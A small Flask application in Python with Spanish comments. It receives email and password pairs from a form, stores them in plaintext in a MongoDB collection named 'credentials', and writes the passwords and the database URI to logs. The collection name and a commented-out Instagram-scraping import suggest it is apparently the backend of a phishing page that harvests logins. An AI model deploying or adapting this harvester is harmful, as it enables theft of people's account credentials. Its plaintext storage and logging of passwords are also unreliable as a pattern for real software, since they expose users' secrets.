from flask import Flask, request, render_template, jsonify
#import instaloader
import pymongo
from pymongo import MongoClient
import os
import logging

app = Flask(__name__)

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

mongo_uri = os.getenv("MONGODB_URI")
logger.info(f"mongo_uri => {mongo_uri}")

client = MongoClient(mongo_uri)
db = client.mydatabase
collection = db.credentials
logger.info("CONEXIÓN ESTABLECIDA CON MONGODB")

# Ruta para la página principal
@app.route('/')
def index():
    return render_template('index.html')

# Ruta para el procesamiento del formulario
@app.route('/submit', methods=['POST'])
def submit():
    logger.info("Endpoint /submit alcanzado")

    try:
        #email = request.form['email']
        email = request.form.get('email')
        #password = request.form['password']
        password = request.form.get('password')
        logger.info(f"Datos recibidos en /submit: email={email}, password={password}")

        collection.insert_one({"email": email, "password": password})
        logger.info("Datos almacenados correctamente en MongoDB.")
        return jsonify({"message": "Credenciales almacenadas correctamente"}), 200
    except Exception as e:
        logger.error(f"Error al almacenar credenciales: {e}")
        return jsonify({"error": str(e)}), 500

if __name__ == '__main__':
    app.run(port=5001)
